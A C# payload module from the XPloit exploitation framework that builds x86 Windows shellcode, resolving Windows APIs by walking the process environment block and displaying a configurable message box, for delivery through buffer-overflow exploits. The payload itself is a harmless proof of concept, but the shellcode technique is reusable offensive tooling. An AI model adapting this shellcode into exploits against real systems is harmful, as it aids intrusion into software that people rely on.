﻿using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Enums;
using XPloit.Core.Extensions;
using XPloit.Core.Helpers;
using XPloit.Core.Requirements.Payloads;

namespace Payloads.Multi.Windows.x86
{
    public class PayloadX86WindowsMessageBox : Payload, BufferOverflowPayloadRequirement.IBufferOverflowPayload
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Show MessageBox"; } }
        public override EArquitecture Arquitecture { get { return EArquitecture.x86; } }
        public override EPlatform Platform { get { return EPlatform.Windows; } }
        #endregion

        #region Properties
        [ConfigurableProperty(Description = "Message")]
        public string Message { get; set; }
        [ConfigurableProperty(Description = "Exit technique: Seh, Process, Thread, None")]
        public EExitFunc ExitFunction { get; set; }
        #endregion

        public override byte[] GetValue(Target mod)
        {
            byte[] shellcode1 = new byte[]
                {
                0x33,0xc9,0x64,0x8b,0x49,0x30,0x8b,0x49,0x0c,0x8b,
                0x49,0x1c,0x8b,0x59,0x08,0x8b,0x41,0x20,0x8b,0x09,
                0x80,0x78,0x0c,0x33,0x75,0xf2,0x8b,0xeb,0x03,0x6d,
                0x3c,0x8b,0x6d,0x78,0x03,0xeb,0x8b,0x45,0x20,0x03,
                0xc3,0x33,0xd2,0x8b,0x34,0x90,0x03,0xf3,0x42,0x81,
                0x3e,0x47,0x65,0x74,0x50,0x75,0xf2,0x81,0x7e,0x04,
                0x72,0x6f,0x63,0x41,0x75,0xe9,0x8b,0x75,0x24,0x03,
                0xf3,0x66,0x8b,0x14,0x56,0x8b,0x75,0x1c,0x03,0xf3,
                0x8b,0x74,0x96,0xfc,0x03,0xf3,0x33,0xff,0x57,0x68,
                0x61,0x72,0x79,0x41,0x68,0x4c,0x69,0x62,0x72,0x68,
                0x4c,0x6f,0x61,0x64,0x54,0x53,0xff,0xd6,0x33,0xc9,
                0x57,0x66,0xb9,0x33,0x32,0x51,0x68,0x75,0x73,0x65,
                0x72,0x54,0xff,0xd0,0x57,0x68,0x6f,0x78,0x41,0x01,
                0xfe,0x4c,0x24,0x03,0x68,0x61,0x67,0x65,0x42,0x68,
                0x4d,0x65,0x73,0x73,0x54,0x50,0xff,0xd6,0x57
                };

            byte[] message = AsmHelper.StringToAsmX86(Message);
            //0x68, 
            //0x72,0x6c,0x64,0x21,0x68,0x6f,0x20,0x57,0x6f,0x68, 
            //0x48,0x65,0x6c,0x6c,

            byte[] shellcode3 = new byte[]
                {
                0x8b,0xcc,0x57,0x57,0x51,0x57,
                0xff,0xd0,0x57,0x68,0x65,0x73,0x73,0x01,0xfe,0x4c,
                0x24,0x03
                };

            return shellcode1.Concat(message).Concat(shellcode3);
        }
    }
}